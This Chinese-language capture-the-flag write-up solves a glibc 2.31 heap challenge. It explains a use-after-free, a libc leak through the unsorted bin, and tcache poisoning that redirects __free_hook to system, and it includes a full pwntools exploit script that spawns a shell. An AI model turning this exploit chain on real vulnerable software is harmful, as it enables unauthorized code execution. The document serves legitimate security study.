# editable_note

## 题目简述

这是 glibc 2.31 下的堆菜单题。`delete` 释放 chunk 后没有清空全局指针，`show` 和 `edit` 仍能访问已释放内存，形成 UAF 读写。利用分成两步：先从 unsorted bin 泄露 `main_arena`，再修改 tcache 单链表的 `fd`，把一次分配导向 `__free_hook`。

## 解题过程

先申请 8 个请求大小为 `0x90` 的 chunk，再申请一个小 chunk 防止尾部 chunk 与 top chunk 合并。依次释放前 8 个时，同尺寸 tcache 最多容纳 7 个，最后一个进入 unsorted bin；通过悬空指针 `show(7)` 可以读到指向 `main_arena` 的链表指针。

计算 libc 基址后，在 `0x30` size class 中准备三个 chunk。释放两个 chunk形成 tcache 链，再通过 UAF 修改链首 chunk 的 `fd` 为 `__free_hook`。连续申请两次后，第二个返回指针即落在 hook 上，写入 `system`，最后释放保存 `/bin/sh` 的 chunk。

```python
from pwn import *

context.arch = "amd64"

elf = ELF("./vuln", checksec=False)
libc = ELF("./libc-2.31.so", checksec=False)

if args.REMOTE:
    host = args.HOST or "challenge.example"
    port = int(args.PORT or 31337)
    io = remote(host, port)
else:
    io = process(elf.path)


def add(index: int, size: int) -> None:
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendlineafter(b"Size: ", str(size).encode())


def delete(index: int) -> None:
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b"Index: ", str(index).encode())


def edit(index: int, content: bytes) -> None:
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendlineafter(b"Content: ", content)


def show(index: int) -> None:
    io.sendlineafter(b">", b"4")
    io.sendlineafter(b"Index: ", str(index).encode())


# 7 个进入 tcache，第 8 个进入 unsorted bin；index 8 是隔离块。
for index in range(8):
    add(index, 0x90)
add(8, 0x20)

for index in range(8):
    delete(index)

show(7)
main_arena_pointer = u64(io.recv(6).ljust(8, b"\x00"))
libc.address = main_arena_pointer - 0x1ECBE0
free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]

# 构造 0x30 tcache 链：9 -> 8，然后用 UAF 把 9->fd 改到 free_hook。
add(9, 0x20)
add(10, 0x20)
delete(8)
delete(9)

edit(10, b"/bin/sh\x00")
edit(9, p64(free_hook))

add(11, 0x20)  # 取回原 index 9 chunk
add(12, 0x20)  # 返回 __free_hook
edit(12, p64(system))

delete(10)      # __free_hook("/bin/sh") -> system("/bin/sh")
io.interactive()
```

偏移 `0x1ecbe0` 只适用于题目配套 glibc。原 PDF 没有保存最终 flag，但已经给出完整 shell 利用流程。

## 方法总结

本题是标准的“UAF leak + tcache poisoning”。堆题不能只记菜单模板：必须确认 glibc 版本、请求大小对应的 chunk size、tcache 容量、隔离块以及悬空指针仍可读写。泄露和任意写使用的是同一个生命周期错误，但分别作用于 unsorted bin 元数据和 tcache `fd`。
